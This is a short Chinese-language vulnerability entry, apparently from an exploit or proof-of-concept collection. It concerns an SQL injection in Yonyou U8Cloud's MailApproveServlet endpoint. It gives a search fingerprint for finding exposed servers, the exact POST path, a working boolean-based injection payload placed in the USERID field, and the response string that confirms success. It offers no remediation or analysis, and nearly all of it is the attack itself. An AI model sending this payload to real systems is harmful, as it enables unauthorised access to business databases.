# 用友U8Cloudnc.bs.pf.pub.MailApproveServlet存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`title=="U8C"`
- **请求**：`POST /service/~uap/nc.bs.pf.pub.MailApproveServlet HTTP/1.1`

**Payload**
```
NEEDDISPATCH=&BILLID=1&BILLTYPE=BJ&USERID=admin' AND 1402=(char(113)char(122)char(122)char(112)char(113)(CASE WHEN (1402=1402) THEN char(49) ELSE char(48) END)char(113)char(112)char(112)char(122)char(113))-- ARhW&PASSWORD=admin&RESULT=APPROVED&DATASOURCE=U8cloud
```
- **响应特征**：200 qzzpq1qppzq